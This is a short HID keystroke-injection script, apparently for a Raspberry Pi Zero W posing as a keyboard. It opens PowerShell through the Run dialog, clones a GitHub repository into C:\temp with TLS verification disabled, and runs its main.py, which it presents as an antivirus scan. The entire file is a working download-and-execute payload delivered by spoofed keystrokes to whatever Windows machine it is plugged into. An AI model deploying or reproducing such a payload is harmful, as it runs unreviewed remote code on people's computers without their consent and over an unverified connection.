layout('us') // Set the keyboard layout to US
press("GUI r") // Simulate pressing the Windows key + r to open the Run dialog
delay(500) // Delay for 500 milliseconds
type("powershell\n") // Type "powershell" and press Enter to open PowerShell
delay(1000) // Delay for 1 second

// PowerShell commands to interact with HID devices
type("$hidDevice = Get-PnpDevice | ? { $_.Class -eq 'HIDClass' } | Select-Object -First 1\n")
type("Write-Output $hidDevice\n")

// Define the repository URL
type("$repositoryUrl = 'https://github.com/MrLuzSec10010/Anti-virus-Rasp-Zero-w.git'\n")

type("mkdir C:\\temp\n")

// Define the directory to extract the repository to
type("$extractDirectory = 'C:\\temp'\n")

// Clone the repository
type("git -c http.sslverify=false clone $repositoryUrl $extractDirectory\n")

// Change to the repository directory
type("Set-Location $extractDirectory\n")

// Install the required dependencies
//type("pip install -r requirements.txt\n")

// Start the main.py file
type("python main.py\n")

// Display a message when the scan is complete
type("Write-Host 'Scan complete. PC will restart in 5 seconds.'\n")

// Wait for 5 seconds
//type("Start-Sleep -Seconds 5\n")

// Restart the computer
//type("Restart-Computer\n")

// Close PowerShell
//type("exit\n")
